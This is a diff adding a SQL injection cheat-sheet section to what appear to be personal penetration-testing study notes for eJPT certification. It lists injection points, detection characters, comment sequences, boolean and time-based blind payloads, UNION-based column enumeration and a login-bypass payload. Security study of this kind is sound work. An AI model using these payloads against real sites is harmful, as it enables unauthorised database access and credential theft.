@@ -64,6 +64,33 @@ To automate the process, use the following tools
 -     rm ~/.ssh/know_hosts
 -     ssh -p <port> -i <file> root@10.0.2.10
 
+-----------------------------------------------------------------SQL INJECTION-------------------------------------------------------------------------
+- where you can find SQL injection:
+- GET REQUEST
+-     http://site.com/index.php?id=1
+- POST REQEUST
+-     login page
+- Header parameter like Referrer, host, user agent
+- Cookie: id=123123;
+- to detect SQL injection use the following chars (' " \)
+- to comment the remain statement in get reqeust use
+-     --+
+- to comment the remain statement in port reqeust use
+-     '--SPACE 
+-     '-- - 
+-     ' #
+- Blined BOOLEAN SQL INJECTION
+-     SELECT "You are in ..." where id='2' and 'a'='a';
+- Time-Based SQL INJECTION
+-     ?id=2' and sleep(5) --+
+- queries you man use
+-     SELECT username,password from accounts where name='admin' limit 0,1;
+-     username=' UNION SELECT 'nurhodelta','password','c','d','f','a','a' -- &password=password&login=
+- find the total number of vuln columns
+-     ?id=2' order by n --+
+-     ?id=2' union select 1,2,3,4,n-1 --+
+-     ?id=2' union select 1,version(),database(),user() --+
+- 
 
 Platforms
 1. for Initial Access work on eJPT, This article and official content 
